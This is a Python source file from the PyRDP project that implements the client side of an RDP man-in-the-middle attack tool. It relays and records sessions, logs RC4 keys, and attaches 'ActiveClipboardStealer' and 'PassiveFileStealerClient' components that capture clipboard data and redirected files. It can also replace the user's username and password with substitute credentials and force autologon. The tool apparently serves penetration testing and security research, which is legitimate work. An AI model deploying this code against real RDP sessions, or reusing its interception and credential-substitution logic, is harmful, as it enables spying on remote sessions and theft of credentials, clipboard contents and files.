#
# This file is part of the PyRDP project.
# Copyright (C) 2018 GoSecure Inc.
# Licensed under the GPLv3 or later.
#

from socket import socket
from typing import BinaryIO, Dict

from pyrdp.core import getLoggerPassFilters
from pyrdp.core.ssl import ClientTLSContext
from pyrdp.enum import ClientCapabilityFlag, ClientInfoFlags, ParserMode, PlayerMessageType, SegmentationPDUType, \
    VirtualChannelName
from pyrdp.enum.negotiation import NegotiationType
from pyrdp.layer import ClientConnectionLayer, ClipboardLayer, DeviceRedirectionLayer, FastPathLayer, \
    GCCClientConnectionLayer, MCSClientConnectionLayer, MCSLayer, RawLayer, SecurityLayer, \
    SegmentationLayer, SlowPathLayer, TLSSecurityLayer, TPKTLayer, TwistedTCPLayer, VirtualChannelLayer, X224Layer
from pyrdp.layer.layer import LayerChainItem
from pyrdp.logging import LOGGER_NAMES, RC4LoggingObserver
from pyrdp.mcs import MCSChannelFactory, MCSClientChannel, MCSClientRouter, MCSUserObserver
from pyrdp.mitm.observer import MITMFastPathObserver, MITMSlowPathObserver
from pyrdp.mitm.virtual_channel.clipboard import ActiveClipboardStealer
from pyrdp.mitm.virtual_channel.device_redirection import PassiveFileStealerClient
from pyrdp.mitm.virtual_channel.virtual_channel import MITMVirtualChannelObserver
from pyrdp.parser import createFastPathParser, NegotiationRequestParser, NegotiationResponseParser
from pyrdp.pdu import ClientInfoPDU, GCCConferenceCreateResponsePDU, MCSChannelJoinRequestPDU
from pyrdp.pdu.gcc import GCCConferenceCreateRequestPDU
from pyrdp.pdu.rdp.connection import ClientDataPDU, ServerDataPDU
from pyrdp.recording import FileLayer, Recorder, RecordingFastPathObserver, RecordingSlowPathObserver, SocketLayer
from pyrdp.security import RC4CrypterProxy, SecuritySettings


class MITMClient(MCSChannelFactory, MCSUserObserver):
    def __init__(self, server, fileHandle: BinaryIO, livePlayerSocket: socket,
                 replacementUsername=None, replacementPassword=None):
        MCSChannelFactory.__init__(self)
        self.log = getLoggerPassFilters(f"{LOGGER_NAMES.MITM_CONNECTIONS}.{server.getSessionId()}.client")
        self.log.addFilter(server.metadataFilter)

        self.replacementUsername = replacementUsername
        self.replacementPassword = replacementPassword

        self.server = server
        self.channelMap: Dict[int, str] = {}
        self.channelDefinitions = []
        self.channelObservers = {}
        self.deviceRedirectionObserver = None
        self.useTLS = False
        self.user = None
        self.fastPathObserver = None
        self.conferenceCreateResponse = None
        self.serverData = None
        self.crypter = RC4CrypterProxy()

        rc4Log = getLoggerPassFilters(f"{self.log.name}.rc4")
        self.securitySettings = SecuritySettings(SecuritySettings.Mode.CLIENT)
        self.securitySettings.addObserver(self.crypter)
        self.securitySettings.addObserver(RC4LoggingObserver(rc4Log))

        self.tcp = TwistedTCPLayer()
        self.tcp.createObserver(onConnection=self.startConnection, onDisconnection=self.onDisconnection)

        self.segmentation = SegmentationLayer()
        self.segmentation.createObserver(onUnknownHeader=self.onUnknownTPKTHeader)

        self.tpkt = TPKTLayer()

        self.x224 = X224Layer()
        self.x224.createObserver(onConnectionConfirm=self.onConnectionConfirm, onDisconnectRequest=self.onDisconnectRequest)

        self.mcs = MCSLayer()
        self.router = MCSClientRouter(self.mcs, self)
        self.mcs.addObserver(self.router)
        self.router.createObserver(onConnectResponse=self.onConnectResponse, onDisconnectProviderUltimatum=self.onDisconnectProviderUltimatum)

        self.mcsConnect = MCSClientConnectionLayer(self.mcs)

        self.gccConnect = GCCClientConnectionLayer(b"1")
        self.gccConnect.createObserver(onPDUReceived=self.onConferenceCreateResponse)

        self.rdpConnect = ClientConnectionLayer()
        self.rdpConnect.createObserver(onPDUReceived=self.onServerData)

        self.securityLayer = None
        self.slowPathLayer = SlowPathLayer()
        self.fastPathLayer = None

        self.tcp.setNext(self.segmentation)
        self.segmentation.attachLayer(SegmentationPDUType.TPKT, self.tpkt)

        LayerChainItem.chain(self.tpkt, self.x224, self.mcs)
        LayerChainItem.chain(self.mcsConnect, self.gccConnect, self.rdpConnect)

        record_layers = [FileLayer(fileHandle)]

        if livePlayerSocket is not None:
            record_layers.append(SocketLayer(livePlayerSocket))

        self.recorder = Recorder(record_layers)

    def getProtocol(self):
        return self.tcp

    def startConnection(self):
        """
        Start the connection sequence to the target machine.
        """
        self.log.debug("TCP connected")
        negotiation = self.server.getNegotiationPDU()
        parser = NegotiationRequestParser()
        self.x224.sendConnectionRequest(parser.write(negotiation))

    def onDisconnection(self, reason):
        self.log.debug(f"Connection closed: {reason}")
        self.server.disconnect()
        self.log.removeFilter(self.server.metadataFilter)

    def onDisconnectRequest(self, pdu):
        self.log.debug("X224 Disconnect Request received")
        self.disconnect()

    def disconnect(self):
        self.log.debug("Disconnecting")
        self.tcp.disconnect()

    def onUnknownTPKTHeader(self, header):
        self.log.error("Closing the connection because an unknown TPKT header was received. Header: 0x%(header)02lx",
                       {"header": header})
        self.disconnect()

    def onConnectionConfirm(self, pdu):
        """
        Called when the X224 layer is connected.
        """
        self.log.debug("Connection Confirm received")

        parser = NegotiationResponseParser()
        response = parser.parse(pdu.payload)

        if response.type == NegotiationType.TYPE_RDP_NEG_FAILURE:
            self.log.error("Server returned a TYPE_RDP_NEG_FAILURE packet, most likely because NLA is "
                           "enforced by the server and the MITM does not handle NLA.")

        if response.tlsSelected:
            self.tcp.startTLS(ClientTLSContext())
            self.useTLS = True

        self.server.onConnectionConfirm(pdu)

    def onConnectInitial(self, gccConferenceCreateRequest: GCCConferenceCreateRequestPDU, clientData: ClientDataPDU):
        """
        Called when a Connect Initial PDU is received.
        :param gccConferenceCreateRequest: the conference create request.
        :param clientData: the RDPClientDataPDU.
        """
        self.log.info("Client Data received with client name "
                      "%(clientName)s, resolution %(desktopWidth)dx%(desktopHeight)d",
                      {"clientName": clientData.coreData.clientName, "desktopWidth": clientData.coreData.desktopWidth,
                       "desktopHeight": clientData.coreData.desktopHeight})
        self.recorder.record(clientData, PlayerMessageType.CLIENT_DATA)

        clientData.coreData.earlyCapabilityFlags &= ~ClientCapabilityFlag.RNS_UD_CS_WANT_32BPP_SESSION

        if clientData.networkData:
            self.channelDefinitions = clientData.networkData.channelDefinitions

        self.gccConnect.conferenceName = gccConferenceCreateRequest.conferenceName
        self.rdpConnect.sendPDU(clientData)

    def onConnectResponse(self, pdu):
        """
        Called when an MCS Connect Response PDU is received.
        """
        if pdu.result != 0:
            self.log.error("MCS Connection Failed")
            self.server.onConnectResponse(pdu, None)
        else:
            self.log.debug("MCS Connection Successful")
            self.mcsConnect.recv(pdu)
            self.server.onConnectResponse(pdu, self.serverData)

    def onConferenceCreateResponse(self, pdu):
        """
        Called when a GCC Conference Create Response is received.
        :param pdu: the conference response PDU
        :type pdu: GCCConferenceCreateResponsePDU
        """
        self.conferenceCreateResponse = pdu

    def onServerData(self, serverData: ServerDataPDU):
        """
        Called when the server data from the GCC Conference Create Response is received.
        """
        self.serverData = serverData
        self.securitySettings.generateClientRandom()
        self.securitySettings.serverSecurityReceived(serverData.security)

        self.channelMap[self.serverData.network.mcsChannelID] = "I/O"

        for index in range(len(serverData.network.channels)):
            channelID = serverData.network.channels[index]
            self.channelMap[channelID] = self.channelDefinitions[index].name

    def onAttachUserRequest(self):
        self.user = self.router.createUser()
        self.user.addObserver(self)
        self.user.attach()

    def onAttachConfirmed(self, user):
        # MCS Attach User Confirm successful
        self.server.onAttachConfirmed(user)

    def onAttachRefused(self, user, result):
        # MCS Attach User Confirm failed
        self.server.onAttachRefused(user, result)

    def onChannelJoinRequest(self, pdu: MCSChannelJoinRequestPDU):
        self.mcs.sendPDU(pdu)

    def buildChannel(self, mcs, userID, channelID):
        channelName = self.channelMap.get(channelID, None)
        channelLog = channelName + " (%d)" % channelID if channelName else channelID
        self.log.debug("building channel %(arg1)s for user %(arg2)d", {"arg1": channelLog, "arg2": userID })

        if channelName == "I/O":
            channel = self.buildIOChannel(mcs, userID, channelID)
        elif channelName == VirtualChannelName.CLIPBOARD:
            channel = self.buildClipboardChannel(mcs, userID, channelID)
        elif channelName == VirtualChannelName.DEVICE_REDIRECTION:
            channel = self.buildDeviceRedirectionChannel(mcs, userID, channelID)
        else:
            channel = self.buildVirtualChannel(mcs, userID, channelID)

        self.server.onChannelJoinAccepted(userID, channelID)
        return channel

    def createSecurityLayer(self):
        encryptionMethod = self.serverData.security.encryptionMethod

        if self.useTLS:
            return TLSSecurityLayer()
        else:
            return SecurityLayer.create(encryptionMethod, self.crypter)

    def buildVirtualChannel(self, mcs, userID, channelID) -> MCSClientChannel:
        channel = MCSClientChannel(mcs, userID, channelID)
        securityLayer = self.createSecurityLayer()
        rawLayer = RawLayer()

        LayerChainItem.chain(channel, securityLayer, rawLayer)

        observer = MITMVirtualChannelObserver(rawLayer)
        rawLayer.addObserver(observer)
        self.channelObservers[channelID] = observer

        return channel

    def buildClipboardChannel(self, mcs: MCSLayer, userID: int, channelID: int) -> MCSClientChannel:
        """
        :param mcs: The MCS Layer to transport traffic
        :param userID: The mcs user that builds the channel
        :param channelID: The channel ID to use to communicate in that channel
        :return: MCSClientChannel that handles the Clipboard virtual channel traffic from the server to the MITM.
        """
        # Create all necessary layers
        channel = MCSClientChannel(mcs, userID, channelID)
        securityLayer = self.createSecurityLayer()
        virtualChannelLayer = VirtualChannelLayer()
        clipboardLayer = ClipboardLayer()

        LayerChainItem.chain(channel, securityLayer, virtualChannelLayer, clipboardLayer)

        # Create and link the MITM Observer for the client side to the clipboard layer.
        activeClipboardObserver = ActiveClipboardStealer(clipboardLayer, self.recorder, self.log)
        clipboardLayer.addObserver(activeClipboardObserver)

        self.channelObservers[channelID] = activeClipboardObserver

        return channel

    def buildDeviceRedirectionChannel(self, mcs: MCSLayer, userID: int, channelID: int) -> MCSClientChannel:
        """
        :param mcs: The MCS Layer to transport traffic
        :param userID: The mcs user that builds the channel
        :param channelID: The channel ID to use to communicate in that channel
        :return: MCSClientChannel that handles the Device redirection virtual channel traffic from the server to the MITM.
        """
        # Create all necessary layers
        channel = MCSClientChannel(mcs, userID, channelID)
        securityLayer = self.createSecurityLayer()
        virtualChannelLayer = VirtualChannelLayer(activateShowProtocolFlag=False)
        deviceRedirectionLayer = DeviceRedirectionLayer()

        LayerChainItem.chain(channel, securityLayer, virtualChannelLayer, deviceRedirectionLayer)

        # Create and link the MITM Observer for the client side to the device redirection layer.
        self.deviceRedirectionObserver = PassiveFileStealerClient(deviceRedirectionLayer, self.recorder, self.log)
        deviceRedirectionLayer.addObserver(self.deviceRedirectionObserver)

        self.channelObservers[channelID] = self.deviceRedirectionObserver

        return channel

    def buildIOChannel(self, mcs: MCSLayer, userID: int, channelID: int) -> MCSClientChannel:
        encryptionMethod = self.serverData.security.encryptionMethod
        self.securityLayer = self.createSecurityLayer()
        self.securityLayer.createObserver(onLicensingDataReceived=self.onLicensingDataReceived)

        slowPathObserver = MITMSlowPathObserver(self.log, self.slowPathLayer)
        self.slowPathLayer.addObserver(slowPathObserver)
        self.slowPathLayer.addObserver(RecordingSlowPathObserver(self.recorder))
        self.channelObservers[channelID] = slowPathObserver

        fastPathParser = createFastPathParser(self.useTLS, encryptionMethod, self.crypter, ParserMode.CLIENT)
        self.fastPathLayer = FastPathLayer(fastPathParser)
        self.fastPathObserver = MITMFastPathObserver(self.log, self.fastPathLayer)
        self.fastPathLayer.addObserver(self.fastPathObserver)
        self.fastPathLayer.addObserver(RecordingFastPathObserver(self.recorder, PlayerMessageType.FAST_PATH_OUTPUT))

        channel = MCSClientChannel(mcs, userID, channelID)
        LayerChainItem.chain(channel, self.securityLayer, self.slowPathLayer)

        self.segmentation.attachLayer(SegmentationPDUType.FAST_PATH, self.fastPathLayer)

        if self.useTLS:
            self.securityLayer.securityHeaderExpected = True
        elif encryptionMethod != 0:
            self.log.debug("Sending Security Exchange")
            self.slowPathLayer.previous.sendSecurityExchange(self.securitySettings.encryptClientRandom())

        return channel

    def onChannelJoinRefused(self, user, result, channelID):
        self.server.onChannelJoinRefused(user, result, channelID)

    def onClientInfoPDUReceived(self, pdu: ClientInfoPDU):

        # If set, replace the provided username and password to connect the user regardless of
        # the credentials they entered.
        if self.replacementUsername is not None:
            pdu.username = self.replacementUsername
        if self.replacementPassword is not None:
            pdu.password = self.replacementPassword

        if self.replacementUsername is not None and self.replacementPassword is not None:
            pdu.flags |= ClientInfoFlags.INFO_AUTOLOGON

        # Tell the server we don't want compression (unsure of the effectiveness of these flags)
        pdu.flags &= ~ClientInfoFlags.INFO_COMPRESSION
        pdu.flags &= ~ClientInfoFlags.INFO_CompressionTypeMask
        self.log.debug("Sending Client Info: %(arg1)s", {"arg1": pdu})
        self.securityLayer.sendClientInfo(pdu)

    def onLicensingDataReceived(self, data):
        self.log.debug("Licensing data received")

        if self.useTLS:
            self.securityLayer.securityHeaderExpected = False

        self.server.onLicensingDataReceived(data)

    def onDisconnectProviderUltimatum(self, pdu):
        self.log.debug("Disconnect Provider Ultimatum received")
        self.server.sendDisconnectProviderUltimatum(pdu)

    def getChannelObserver(self, channelID):
        return self.channelObservers[channelID]

    def getFastPathObserver(self):
        return self.fastPathObserver
